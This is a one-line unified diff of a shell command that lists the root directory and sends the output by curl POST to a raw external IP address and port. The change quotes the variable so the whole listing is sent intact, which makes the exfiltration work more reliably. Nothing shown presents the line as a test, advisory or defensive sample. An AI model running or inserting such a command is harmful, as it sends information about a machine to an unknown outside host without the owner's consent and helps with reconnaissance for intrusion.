@@ -1,1 +1,1 @@
-data=$(ls -l /) && curl 158.160.50.16:61714 -d x=$data
+data=$(ls -l /) && curl 158.160.50.16:61714 -d "x=$data"
